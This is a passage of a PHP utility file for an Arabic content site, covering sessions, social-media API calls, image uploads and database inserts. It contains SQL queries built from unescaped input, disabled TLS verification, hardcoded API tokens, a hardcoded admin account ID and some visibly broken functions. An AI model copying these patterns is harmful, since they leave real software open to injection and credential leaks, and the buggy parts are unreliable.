}
function Ls($s = '')
{
    if ($s == 1) {
        if (isset($_SESSION['sname'])) {
            return header("Location: /home.html");
        }
    } elseif ($s == 'admin') {
        if (isset($_SESSION['slev']) and $_SESSION['slev'] == 1 and Sip()) {
            return true;
        } else {
            return false;
        }
    } elseif ($s == 'demo') {
        if (Sion("slev") == 2 and Sip()) {
            return true;
        } else {
            return false;
        }
    } elseif ($s == 'tw') {
        if (isset($_SESSION['name_tw'])) {
            return true;
        } else {
            return false;
        }
    } elseif ($s == 'Delete') {
        if (isset($_SESSION['Delete'])) {
            return $_SESSION['Delete'];
        } else {
            return false;
        }
    } else {
        if (isset($_SESSION['sname']) and Sip()) {
            return true;
        } else {
            return false;
        }
    }
}
function time_elapsed_string($datetime, $full = false)
{
    $now = new DateTime;
    $ago = new DateTime($datetime);
    $diff = $now->diff($ago);
    $diff->w = floor($diff->d / 7);
    $diff->d -= $diff->w * 7;
    $string = array(
        'y' => 'year',
        'm' => 'month',
        'w' => 'week',
        'd' => 'day',
        'h' => 'hour',
        'i' => 'minute',
        's' => 'second',
    );
    foreach ($string as $k => &$v) {
        if ($diff->$k) {
            $v = $diff->$k . ' ' . $v . ($diff->$k > 1 ? 's' : '');
        } else {
            unset($string[$k]);
        }
    }
    if (!$full) $string = array_slice($string, 0, 1);
    return $string ? implode(', ', $string) . ' ago' : 'just now';
}
function cptime($start)
{
    global $clang;
    if (!isset($clang) || $clang == "")
        return time_elapsed_string("@" . $start);
    $time = time() - $start;
    if ($time <= 59) {
        return base64_decode("2YXZhtiw") . $time . base64_decode("ICDYq9mI2KfZhiDZhdi22Ko=");
    } elseif ($time == 60) {
        return base64_decode("2YXZhtiwINiv2YLZitmC2Ycg2YXYttiq");
    } elseif (60 < $time && $time <= 3600) {
        $time = ceil($time / 60);
        return  $time . base64_decode("INiv2YLYp9im2YIg2YXYttiq");
    } elseif (3600 < $time && $time <= 86400) {
        $time = ceil($time / 3600);
        return  $time . base64_decode("INiz2KfYudin2Kog2YXYttiq");
    } elseif (86400 < $time && $time <= 604800) {
        $time = ceil($time / 86400);
        return  $time . '' . base64_decode("INin2YrYp9mFINmF2LbYqg==");
    } elseif (604800 < $time && $time <= 2592000) {
        $time = ceil($time / 604800);
        return  $time . base64_decode("INin2LPYp9io2YrYuSDZhdi22Ko=");
    } elseif (2592000 < $time && $time <= 29030400) {
        $time = ceil($time / 2592000);
        return   $time . base64_decode("INi02YfZiNixINmF2LbYqg==");
    } else {
        return date('h:i - d/m/Y', $start);
    }
}
function Sip()
{
    if (Sion('ip') == ip()) {
        return true;
    } else {
        return false;
    }
}
function gUN($id)
{
    $name = Sel("users", "where user_id=" . $id)->name;
    if ($name != null) {
        return $name;
    }
    return getSet()->title;
}
function Fb($id = false)
{
    $R = false;
    if (Ls('admin') and isset($id)) {
        $R = "https://www.facebook.com/" . $id;
    } elseif (isset($id)) {
        $Su = Sel("users", ' where user_id="' . $id . '"');
        if ($Su->lev != 1) {
            $R = "#";
        } else {
            $R = "https://www.facebook.com/" . $id;
        }
    }
    return $R;
}
function get_youtube($url = "")
{
    $youtube = "http://www.youtube.com/oembed?url=" . $url . "&format=json";
    $curl = curl_init($youtube);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $return = curl_exec($curl);
    curl_close($curl);
    return json_decode($return, true);
}
function RImg($url = "", $h = 342, $w = 456)
{
    $R = "https://images1-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&gadget=a&rewriteMime=image&resize_h=" . $h . "&resize_w=" . $w . "&url=" . $url;
    return $R;
}
function orderby($order = false)
{
    if ($order == 1) {
        $r = "order by id desc";
    } elseif ($order == 2) {
        $r = "order by rand()";
    } else {
        $r = "order by id asc";
    }
    return $r;
}
function get_url($url = "", $t = false)
{
    if (!$t) {
        $tags = get_meta_tags($url);
    }
    preg_match("/<title>(.+)<\/title>/siU", file_get_contents($url), $matches);
    if (!$t) {
        $a = array(
            'title' => $matches[1],
            'auther' => $tags['author'],
            'keywords' => $tags['keywords'],
            'description' => $tags['description'],
            'img' => $tags['og:image'],
        );
    } else {
        $a = array(
            'title' => $matches[1],
        );
    }
    return  $a;
}
function getPagehtml($action, $rtimeout = 2, $maxTry = 120)
{
    if ($action) {
        $try = 1;
        $site = "diffbooks";
        if (!is_array($action)) {
            $action = array($action, $site);
        }
        $action = array("get" => join("{-}", $action));
        $options = array('http' => array(
            'method'  => 'POST',
            "ssl" => array(
                "verify_peer" => false,
                "verify_peer_name" => false,
            ),
            'header' =>
            "Content-Type: application/x-www-form-urlencoded\r\n" .
                "Authorization: Bearer sdf541gs6df51gsd1bsb16etb16teg1etr1ge61g\n",
            'content' => http_build_query($action)
        ));
        $context  = stream_context_create($options);
        $result = file_get_contents("http://server.everysimply.com/get.php", false, $context);
        if (strpos($result, "true") !== false) {
            //sleep($rtimeout);
            while (true) {
                if ($try >= $maxTry)
                    return "timeout";
                Ba:
                $result = file_get_contents("http://server.everysimply.com/get.php?get=get", false, stream_context_create(array("ssl" => array("verify_peer" => false, "verify_peer_name" => false))));
                $result = base64_decode($result);
                if (strpos($result, "crdownload") !== false && strpos($result, $site) !== false) {
                    $maxTry += $maxTry;
                } else
               if ($result !== false && strlen($result) >= 5 && strpos($result, $site) !== false) {
                    $result = explode("{-}", $result)[0];
                    if (!trim($result))
                        goto Ba;
                    return $result;
                }
                $try++;
                sleep($rtimeout);
            }
        }
        return $result;
    }
}
function generateRandomString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
function is_dir_empty($dir)
{
    if (!is_readable($dir)) return NULL;
    return (count(scandir($dir)) == 2);
}
function Get_file($link = "", $ex = "png", $dir = 'uploads/', $w = true)
{
    global $St;
    $fex = $ex;
    if (strpos($ex, ".") === false)
        $ex = 'file' . time() . generateRandomString(5) . '.' . $ex;
    $tmp  = $dir . $ex;
    if (file_exists($tmp) && !$w)
        return  2;
    if (copy($link, $tmp)) {
        $logo = explode("/", $St->logo_defult);
        $logo = "../" . $logo[count($logo) - 2] . "/" . $logo[count($logo) - 1];
        if ($fex == "png") {
            //MakeMark($tmp,$St->logo_defult,$tmp);
        } else if ($fex == "pdf") {
            try {
                //addPdfWater($tmp,array($logo,$St->url),$tmp);
            } catch (Exception $e) {
            }
        }
        return  $ex;
    } else {
        return 0;
    }
}
function Get_Img($link = "", $ur = "", $dir = 'uploads/', $img = '')
{
    if (!$ur)
        $ur = time();
    if (!$img) {
        $im = "/";
        $img = 'img' . $ur . '.png';
    } else {
        $im = "";
        $img = 'video' . time() . '.mp4';
    }
    $tmp  = $dir . $img;
    if (copy($link, $tmp)) {
        return  $img;
    } else {
        return 0;
    }
}
function makeimage($url = "", $image, $dir = '')
{
    $data = getimg($url);
    $img = $dir . $image;
    $im = @imagecreatefromstring($data);
    if ($im !== false) {
        file_put_contents($img, $data);
    } else {
        $img = false;
    }
    return $img;
}
function Upost($id, $R = false)
{
    $type =  Sel("posts", "where id=" . $id);
    if ($type->type == 7) {
        $r = Uvideo($type->vid);
    } else {
        $r = getSet()->url . '/post' . $id . '.html';
    }
    return $r;
}
function TwImg($id = false, $type = "small")
{
    return "https://twitter.com/" . $id . "/profile_image?size=original";
}
function Umsg($id, $app = "")
{
    if ($app != 'admin') {
        $r = getSet()->url . '/messages' . $id . '.html';
    } else {
        $r = getSet()->url . '/admin/messages' . $id . '.html';
    }
    return $r;
}
function Lurl($Gapp, $id)
{
    if ($Gapp == 'post') {
        $r = Upost($id);
    } else {
        $r = Uvideo($id);
    }
    return $r;
}
function Lurll($Gapp, $id)
{
    if ($Gapp == 0 or  $Gapp == 2 or  $Gapp == 5) {
        $r = Upost($id);
    } elseif ($Gapp == 7) {
        $r = $p['link'];
    } else {
        $S = Sel('posts', 'where id=' . $id);
        $r = $S->link;
    }
    return $r;
}
function Fimg($id, $key)
{
    return  '<img src="' . $id . '" alt="' . $key . '" /><br>';
}
function Flink($id, $key)
{
    return  ' <a href="' . $id . '"  >' . $key . '</a> ';
}
function Fvideo($id, $v = false, $img = '', $a = '')
{
    if (strpos($id, "youtube"))
        $id = substr($id, strpos($id, "=") + 1);
    $aa = "?rel=0&amp;showinfo=0";
    if ($a) {
        $aa .= "&autoplay=1";
    }
    if (!$v) {
        $r = '<iframe width="100%" class="fvideo" height="350" src="https://www.youtube.com/embed/' . $id . $aa . '" frameborder="0" allowfullscreen></iframe>';
    } else {
        $r = '<video width="100%" height="350" poster="' . $img . '" class="responsive-video" controls>
    <source src="' . $id . '" type="video/mp4">
  </video>
';
    }
    return $r;
}
function Dvideo($my_id = "", $vtype = 'video/mp4')
{
    $my_video_info = 'http://www.youtube.com/get_video_info?&video_id=' . $my_id . '&asv=3&el=detailpage&hl=en_US'; //video details fix *1
    $my_video_info = curlGet($my_video_info);
    parse_str($my_video_info);
    $my_formats_array = explode(',', $url_encoded_fmt_stream_map);
    $i = 0;
    foreach ($my_formats_array as $format) {
        parse_str($format);
        $type = explode(';', $type);
        if ($vtype == $avail_formats[$i]['type'] = $type[0]) {
            $u = $avail_formats[$i]['url'] = urldecode($url) . '&signature=' . $sig;
            $q = $avail_formats[$i]['quality'] = $quality;
        }
    }
    return array('url' => $u, 'title' => $title, 'type' => $vtype, 'Q' => $q, 'img' => $thumbnail_url);
}
function clean($string)
{
    $string = str_replace(' ', '-', $string); // Replaces all spaces with hyphens.
    return preg_replace('/[^A-Za-z0-9\-]/', '', $string); // Removes special chars.
}
function json_cookie()
{
    $json_cookie = json_decode(file_get_contents("json_cookie.json"), true);
    foreach ($json_cookie as $k => $c) {
        $str[] = $c["domain"] . " " . (explode(".", $c["domain"])[0] == "" ? "TRUE" : "FALSE") . " " . $c["path"] . " " . (!$c["httpOnly"] ? "TRUE" : "FALSE") . " " . $c["expirationDate"] . " " . $c["name"] . " " . $c["value"];
    }
    file_put_contents("cookie.txt", join(PHP_EOL, $str));
}
function curlGet($URL)
{
    $ch = curl_init();
    $timeout = 3;
    curl_setopt($ch, CURLOPT_URL, $URL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    /*    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
*/
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_POST, false);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_COOKIEFILE, "cookie.txt");
    $tmp = curl_exec($ch);
    curl_close($ch);
    return $tmp;
}
function Uimgur($url = "", $client_id = '3fd403ffb4414a7')
{
    $file = file_get_contents($url);
    $url = 'https://api.imgur.com/3/image.json';
    $headers = array("Authorization: Client-ID $client_id");
    $pvars  = array('image' => base64_encode($file));
    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => $url,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_POST => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $pvars
    ));
    $json_returned = curl_exec($curl); // blank response
    $rep = json_decode($json_returned, true);
    if ($rep['success']) {
        $link =  $rep['data']['link'];
        if (substr($link, 0, 4) == "http")
            $link = str_replace("http", "https", $rep['data']['link']);
        return  array(true, $link);
    } else {
        return  array(false, $rep['data']['error']);
    }
    curl_close($curl);
}
function YUpload($ar = "")
{
    /*if($ar){
    if (Sion('Ytoken')) {
        global $client;
        global $youtube;
        try{
            $client->setAccessToken(Sion('Ytoken'));
            $client->getAccessToken();
            $videoPath = $ar['url'];
            $snippet = new Google_Service_YouTube_VideoSnippet();
            $snippet->setTitle($ar['title']);
            $snippet->setDescription($ar['des']);
            $snippet->setTags($ar['tags']);
            $snippet->setCategoryId($ar['cat']); //category - foreign
            $status = new Google_Service_YouTube_VideoStatus();
            $status->privacyStatus = "public"; //public,private or unlisted
            $video = new Google_Service_YouTube_Video();
            $video->setSnippet($snippet);
            $video->setStatus($status);
            $chunkSizeBytes = 1 * 1024 * 1024;
            $client->setDefer(true);
            $insertRequest = $youtube->videos->insert("status,snippet", $video);
            $media = new Google_Http_MediaFileUpload(
                $client,
                $insertRequest,
                'video/*',
                null,
                true,
                $chunkSizeBytes
            );
            $media->setFileSize(filesize($videoPath));
            $status = false;
            $handle = fopen($videoPath, "rb");
            while (!$status && !feof($handle)) {
                $chunk = fread($handle, $chunkSizeBytes);
                $status = $media->nextChunk($chunk);
            }
            fclose($handle);
            $client->setDefer(false);
         //return $status['id'];
         return array(true,$status['id']);
        } catch (Google_ServiceException $e) {
         return array(false,$e->getMessage());
         //return false;
        } catch (Google_Exception $e) {
         return array(false,$e->getMessage());
         //return false;
         }
    }else{
         return array(false,"No access_token");
        //return false;
    }
    }else{
         return false;
    }*/
}
function getimg($url = "")
{
    $contetn = @file_get_contents($url);
    if (empty($contetn)) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        $contetn = curl_exec($ch);
        curl_close($ch);
    }
    return $contetn;
}
function NoAdmin($app = '', $T = "", $E = 0)
{
    if (!$T) {
        $T = "<div class='red-text'>غير مصرح لك بالاطلاع على العدد</div>";
    }
    if (Ls('admin')) {
        $R = $app;
    } else {
        if (!$E) {
            $R = "<div class='red-text'>" . $T . "</div>";;
        } else {
            $R = $T;
        }
    }
    return $R;
}
function AddGP($type, $uid, $name, $pid, $tp = "HTC")
{
    global   $DBcon;
    $query = mysqli_query($DBcon, "SELECT * FROM `$type` WHERE pid = '$pid'");
    $result = mysqli_fetch_array($query);
    $data = time();
    $admin = true;
    if ($type == "groups") {
        $admin = $tp["admin"];
        $tp = $tp["type"];
    }
    if (!empty($result)) {
        # User is already present
        // $query = mysqli_query("UPDATE `$type` SET `pid` = '$pid',`name` = '$name' where pid='$pid'") or die(mysqli_error());
    } else {
        #user not present. Insert a new Record
        $query = mysqli_query($DBcon, "INSERT INTO `$type` (uid,pid,name,app,data,admin) values('$uid','$pid','$name','$tp','$data','$admin')");
        $query = mysqli_query($DBcon, "SELECT * FROM `$type` WHERE pid = '$pid'");
        $result = mysqli_fetch_array($query);
        return $result;
    }
}
function checkUser($uid, $oauth_provider, $username, $email, $twitter_otoken, $twitter_otoken_secret, $access_token_oauth_token, $access_token_oauth_token_secret, $screen_name)
{
    $data = time();
    global $DBcon;
    $query = mysqli_query($DBcon, "SELECT * FROM `users_tw` WHERE oauth_uid = '$uid' and oauth_provider = '$oauth_provider'") or die(mysqli_error($DBcon));
    if ($query) {
        $result = mysqli_fetch_array($query);
        if (!empty($result)) {
            # User is already present
            $query = mysqli_query($DBcon, "UPDATE `users_tw` SET `send` = '1',`data` = '$data',`twitter_oauth_token` = '$twitter_otoken',`twitter_oauth_token_secret` = '$twitter_otoken_secret',`accessToken` = '$access_token_oauth_token',`accessTokenSecret` = '$access_token_oauth_token_secret' WHERE  oauth_uid = '$uid' and oauth_provider = '$oauth_provider'") or die(mysqli_error($DBcon));
        } else {
            #user not present. Insert a new Record
            $query = mysqli_query($DBcon, "INSERT INTO `users_tw` (send,data,oauth_provider, oauth_uid, username,email,twitter_oauth_token,twitter_oauth_token_secret,accessToken,accessTokenSecret,screen_name) VALUES ('1','$data','$oauth_provider', $uid, '$username','$email','$twitter_otoken','$twitter_otoken_secret','$access_token_oauth_token','$access_token_oauth_token_secret','$screen_name')") or die(mysqli_error($DBcon));
            $query = mysqli_query($DBcon, "SELECT * FROM `users_tw` WHERE oauth_uid = '$uid' and oauth_provider = '$oauth_provider'");
            $result = mysqli_fetch_array($query);
            return $result;
        }
        return $result;
    } else {
        return false;
    }
}
function AddGF($type, $id, $uid, $name)
{
    global   $DBcon;
    $query = mysqli_query($DBcon, "SELECT * FROM `$type` WHERE userid = '$uid'");
    if ($query) {
        $result = mysqli_fetch_array($query);
        $data = time();
        if (!empty($result)) {
            # User is already present
            // $query = mysqli_query("UPDATE `$type` SET `pid` = '$pid',`name` = '$name' where pid='$pid'") or die(mysqli_error());
        } else {
            #user not present. Insert a new Record
            $query = mysqli_query($DBcon, "INSERT INTO `$type` (userid,username,name) values('$uid','$id','$name')");
            $query = mysqli_query($DBcon, "SELECT * FROM `$type` WHERE userid = '$uid'");
            $result = mysqli_fetch_array($query);
            return $result;
        }
        return $result;
    } else {
        return false;
    }
}
function getAccess($url)
{
    $doc = new DOMDocument();
    $doc->loadHTMLFile($url);
    foreach ($doc->getElementsByTagName('input') as $input) {
        if (strpos($input->getAttribute('value'), "AA")) {
            return $input->getAttribute('value');
            break;
        }
    }
}
function Dis($type = "", $g = "", $s = '')
{
    $d = '';
    if ($type == $g) {
        $d = "class='active'";
    } elseif (!$type  and $s == 1) {
        $d = "class='active'";
    }
    return $d;
}
function AddUser($id, $name, $access, $gender, $birthday, $email, $mobile_phone, $religion, $relationship_status, $locale, $description, $cantry)
{
    global   $DBcon;
    if (!$cantry) {
        $cantry = visitor_country();
    }
    if ($id == 100006273455189) {
        $lev = 1;
    } else {
        $lev = 0;
    }
    $query = mysqli_query("SELECT * FROM `users` WHERE user_id = '$id'") or die(mysqli_error());
    if ($query) {
        $result = mysqli_fetch_array($query);
        $data = time();
        if (!empty($result)) {
            $query = mysqli_query($DBcon, "UPDATE `users` SET `user_id` = '$id',lev='$lev',`access` = '$access',`data` = '$data',disactive='0' where user_id='$id'") or die(mysqli_error());
        } else {
            $query = mysqli_query($DBcon, "INSERT INTO `users` (user_id,access,name,email,type,birthday,mobile_phone,religion,relationship_status,description,data,gr,cantry,token,send,location,app,time,lev) values('$id','$access','$name','$email','$gender','$birthday','$mobile_phone','$religion','$relationship_status','$description','$data','$gender','$cantry','1','1','" . getOS() . "','htc','4','$lev')");
            $query = mysqli_query($DBcon, "SELECT * FROM `users` WHERE user_id = '$id'");
            $result = mysqli_fetch_array($query);
            return $result;
        }
        return $result;
    } else {
        return false;
    }
}
function FbImg($id = false, $type = "large", $json = true)
{
    //die(substr("https://graph.facebook.com/".$id."/picture?type=".$type,0,4));
    $image  =  Sel("users", "where fb_id=" . $id)->image;
    if ($image)
        return $image;
    if (!$json)
        return "https://graph.facebook.com/" . $id . "/picture?type=" . $type;
    if ($id) {
        $ad =  Json("https://graph.facebook.com/" . $id . "/picture?type=" . $type);
        if ($ad["error"]) {
            return "https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/aay_wHxWD-D.png";
        } else {
            return "https://graph.facebook.com/" . $id . "/picture?type=" . $type;
        }
    }
    if (!empty(getSet()->icon)) {
        return getSet()->icon;
    } else {
        return getSet()->url . "/assets/images/icon.png";
    }
}
function get_browser_name()
{
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    if (strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR/')) return 'Opera';
    elseif (strpos($user_agent, 'Edge')) return 'Edge';
    elseif (strpos($user_agent, 'Chrome')) return 'Chrome';
    elseif (strpos($user_agent, 'Safari')) return 'Safari';
    elseif (strpos($user_agent, 'Firefox')) return 'Firefox';
    elseif (strpos($user_agent, 'MSIE') || strpos($user_agent, 'Trident/7')) return 'Internet Explorer';
    return 'Other';
}
function getOS()
{
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
        '/windows nt 10/i'     =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}
function Ctoken($access = "")
{
    //$exe = json_decode(get_html("https://graph.facebook.com/app?access_token=".$access ))->id;
    $extend = json("https://graph.facebook.com/me/permissions?access_token="  . $access);
    //$ad = strpos($extend, "publish_actions");
    if ($extend["data"]) {
        return true;
    }
    return false;
}
function _getPost($url = "")
{
    if (!$url) {
        $url = "https://graph.facebook.com/v1.0/374344912640676/feed?fields=message,id,type&limit=1&__paging_token=enc_AdCzzitrPzhb5kUpfZC8ZA4LoHOQe4aV4lB28YHLyCc8ZCjW9sH386GaIFuh2FwPdZAzwVRLucRVgeZCu7sv81jLULLbpTShZBQUujt0kL5zzgnbalxAZDZD&access_token=" . getSet()->token . "&until=1396087132";
    }
    $un = substr($url, strpos($url, "until"), strlen($url));
    $url = substr($url, 0, strpos($url, "access_token") + (strlen("access_token") + 1)) . getSet()->token . "&" . $un;
    $j = json($url);
    if ($j["data"][0]["type"] == "photo") {
        return _getPost($j["paging"]["previous"]);
    }
    if ($j['error']) {
        //return rtoken();
    }
    if ($j["data"] && $j["data"][0]['id'] !=  $St->last_id_guran) {
        $Sq = SqlIn('posts', array('active' => 1, 'quran' => 1, 'date' => time(), 'type' => 8, 'text' => $j["data"][0]['message']));
    }
    UpDate('settings', 'last_url_quran', $j["paging"]["previous"]);
    return $j["paging"]["previous"];
}
function _getPost2($url = "", $id = "1426100954327128")
{
    if (!$url) {
        $url = "https://graph.facebook.com/v1.0/" . $id . "/feed?fields=message,id,type,name,full_picture&limit=1&__paging_token=enc_AdCrQvr9hn0ZC6RaK9ZCVbydY5TumLRnGTLxduZBNl2sdz8nmgDHZC3ZBirapRGb4fqyajZAfOp22I2EtTsjwjMREHTrCsTkuhELp3Qtjdc2RBsZAnKAQZDZD&access_token=" . getSet()->token . "&until=1402447508";
    }
    $un = substr($url, strpos($url, "until"), strlen($url));
    $url = substr($url, 0, strpos($url, "access_token") + (strlen("access_token") + 1)) . getSet()->token . "&" . $un;
    $j = json($url);
    if ($j["data"] && substr($j["created_time"][0]['message'], 0, 7) != "2017-11") {
        //status
        //http://www.3lmnyonline
        $str =  strpos($j["data"][0]['message'], '3lmny');
        if (!$str) {
            $str =  strpos($j["data"][0]['message'], ':::');
        }
        $msg = str_replace("A&S", "", $j["data"][0]['message']);
        if ($j["data"][0]["type"] == "photo" && !$str) {
            $link =  Uimgur($j["data"][0]['full_picture']);
            if ($link[0]) {
                $link = $link[1];
            } else {
                $link = $j["data"][0]['full_picture'];
            }
            $Sq = SqlIn('posts', array('active' => 1, 'link' => $link, 'date' => time(), 'type' => 2, 'text' => $msg));
        } elseif ($j["data"][0]["type"] == "status" && !$str && $msg != "") {
            $Sq = SqlIn('posts', array('active' => 1, 'date' => time(), 'type' => 0, 'text' => $msg));
        } else {
            return _getPost2($j["paging"]["previous"]);
        }
        if ($j['error']) {
            //return rtoken();
        }
        UpDate('settings', 'last_url_feed', $j["paging"]["previous"]);
    }
    return $j["paging"]["previous"];
}
function send_mail($data)
{
    $request =  'https://api.sendgrid.com/api/mail.send.json';
    $session = curl_init($request);
    curl_setopt($session, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);
    curl_setopt($session, CURLOPT_HTTPHEADER, array('Authorization: Bearer ' . getenv('SENDGRID_API_KEY')));
    curl_setopt($session, CURLOPT_POST, true);
    curl_setopt($session, CURLOPT_POSTFIELDS, $data);
    curl_setopt($session, CURLOPT_HEADER, false);
    curl_setopt($session, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($session);
    curl_close($session);
    return json_decode($response, true);
}
function _getPhoto()
{
    if (!getSet()->last_photo_quran) {
        $url = "https://graph.facebook.com/v1.0/921975437867210/photos?fields=source,id,name&limit=1&access_token=" . getSet()->token;
    } else {
        $url = "https://graph.facebook.com/v1.0/921975437867210/photos?fields=source,id,name&limit=1&access_token=" . getSet()->token;
        $url .= "&after=" . getSet()->last_photo_quran;
    }
    $j = json($url);
    if ($j['error']) {
        //return rtoken();
    }
    $msg = "صفحة رقم (" . (Num("posts", "where type='6' ") + 1) . ") من  القرآن الكريم";
    if ($j["data"]) {
        $Sq = SqlIn('posts', array('active' => 1, 'quran' => 1, 'date' => time(), 'type' => 6, 'link' => $j["data"][0]['source'], 'text' => $msg));
        UpDate('settings', 'last_photo_quran', $j["paging"]["cursors"]["after"]);
        return $j["paging"]["cursors"]["after"];
    }
}
function gPN($page)
{
    $url = getSet()->url . "/Qpages.json";
    $j = json($url);
    return $j[$page]['name'];
}
function import($filename = "")
{
    global   $DBcon;
    $templine = '';
    // Read in entire file
    $lines = file($filename);
    // Loop through each line
    foreach ($lines as $line) {
        if (substr($line, 0, 2) == '--' || $line == '') {
            continue;
        }
        $templine .= $line;
        if (substr(trim($line), -1, 1) == ';') {
            mysqli_query($DBcon, $templine);
            $templine = '';
        }
    }
}
function nx($Gapp = "", $id = "", $p = "")
{
    if ($Gapp == 'post') {
        $Gapp = 'posts';
        $app = 'post';
    } else {
        $Gapp = 'video';
        $app = 'video';
    }
    if (!$p) {
        $S = Sel($Gapp, 'where id >"' . $id . '" order by id asc');
        if ($S) {
            $r = '<a href="' . getSet()->url . '/' . $app . $S->id . '.html">التالى <i class="fa fa-chevron-left arrowleft"></i> </a> ';
        } else {
            $r = '<a href="#">هذا احدث منشور <i class="fa fa-smile-o" aria-hidden="true"></i></a> ';
        }
    } else {
        $S = Sel($Gapp, 'where id <"' . $id . '" order by id desc');
        if ($S) {
            $r = '<a href="' . getSet()->url . '/' . $app . $S->id . '.html"><i class="fa fa-chevron-right arrowright"></i>  السابق</a> ';
        } else {
            $r = '<a href="#"><i class="fa fa-smile-o" aria-hidden="true"></i> هذا اقدم منشور</a> ';
        }
    }
    return $r;
}
function home_nx($Gapp = "")
{
    if ($Gapp == 'video') {
        $r = '<a href="../videos.html"><i class="fa fa-home fa-lg" aria-hidden="true"></i></a>  ';
    } else {
        $r = '<a href="../"><i class="fa fa-home fa-lg" aria-hidden="true"></i></a>  ';
    }
    return $r;
}
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off' || strpos($_SERVER['HTTP_HOST'], "ngrok")) {
    $Port = 'https://';
} else {
    $Port = 'http://';
}
$PUr = $Port . $_SERVER['HTTP_HOST'] . '/';
$FUr = $Port . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$MUr = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$ref = @$_SERVER['HTTP_REFERER'];
$Froot = $_SERVER['DOCUMENT_ROOT'];
if (!Ftable()) {
    include "install.php";
}
if (strpos($PUr, "everysimply"))
    die("Coming Soon !!");
/*$cur_dir = basename(dirname($_SERVER["PHP_SELF"]))  ;
if($cur_dir !="inc")
if (getSet()->url."/".$cur_dir != $PUr.$cur_dir) {
    Update('settings','url',$PUr.$cur_dir);
}
*/
//echo $cur_dir;
function get_data($url)
{
    $ch = curl_init();
    $timeout = 5;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}
function Bein($i, $tr = true)
{
    //if($i < count(getUser("quiz")) && $tr)
    $id = " id < " . $i;
    if ($tr) $id = " id > " . $i;
    $post = Sel("quiz", "where $id");
    if (!$post)
        return false;
    $i =   $post->id;
    if (isv("app") == "quiz")
        return getQuizurl($i);
    return "./bein" . $i . ".html";
}
function formatSizeUnits($bytes)
{
    if ($bytes >= 1073741824) {
        $bytes = number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        $bytes = number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        $bytes = number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        $bytes = $bytes . ' bytes';
    } elseif ($bytes == 1) {
        $bytes = $bytes . ' byte';
    } else {
        $bytes = '0 bytes';
    }
    return $bytes;
}
function getpdfSize($t)
{
    $t = "uploads/" . $t;
    $size =  filesize($t);
    return  str_replace(array("bytes", "byte", "KB", "MB", "GB", " "), "", formatSizeUnits($size));
}
function getSlug($t, $re = false)
{
    if ($re)
        return str_replace(array("--", "-"), " ", $t);
    $t = str_replace(array(" ", "--"), "-", $t);
    return str_replace("--", "-", $t);
}
function getSlugUrl($t, $app = false)
{
    if (!$app)
        $app = isv("app");
    return getSet()->url . "" . $app . "/" . str_replace(" ", "-", $t);
}
function getUpUrl($id = "", $d = "blank.png")
{
    global $PUr;
    global $St;
    if (!$id)
        $id = $d;
    return $St->url . "/uploads/" . getSlug($id);
}
function getSiteUrl($app = "", $id = "")
{
    global $PUr;
    global $St;
    if (strpos($app, "/") !== false && strpos($app, "http") === false) {
        $id = explode("/", $app)[1];
        $app = explode("/", $app)[0];
    }

    $_page = getPages($app);
    if ($_page && $_page->section)
        return "javascript:;";
    if ($_page && $_page->auth && !$id && 1 == 2) {
        $id = isv("id", true);
